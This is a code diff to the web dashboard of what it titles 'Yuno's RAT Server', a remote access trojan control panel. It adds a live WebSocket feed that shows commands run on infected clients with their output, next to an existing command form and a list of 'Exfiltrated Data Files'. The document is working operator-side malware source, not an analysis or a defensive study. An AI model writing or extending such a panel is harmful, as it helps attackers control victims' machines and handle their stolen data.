@@ -58,7 +58,17 @@
             margin-top: 10px;
             color: #FFFFFF;
         }
+        #output {
+            margin-top: 10px;
+            background-color: #333638;
+            padding: 10px;
+            border: 1px solid #00FF00;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
 </head>
 <body>
     <h1>Yuno's RAT Server</h1>
@@ -87,6 +97,7 @@
             <button type="submit">Send</button>
         </form>
         <div id="result"></div>
+        <div id="output"></div>
     </div>
     <div class="section">
         <h2>Exfiltrated Data Files</h2>
@@ -101,6 +112,26 @@
         </ul>
     </div>
     <script>
+        // Connect to WebSocket server
+        const socket = io();
+
+        socket.on('connect', () => {
+            console.log('Connected to WebSocket server');
+        });
+
+        socket.on('command_output', (data) => {
+            const outputDiv = document.getElementById('output');
+            const timestamp = data.timestamp;
+            const clientId = data.client_id;
+            const command = data.command;
+            const output = data.output;
+            // Append the output with timestamp
+            const newOutput = `[${timestamp}] ${clientId} executed "${command}":\n${output}\n\n`;
+            outputDiv.textContent += newOutput;
+            // Scroll to bottom
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        });
+
         document.getElementById('command-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(e.target);
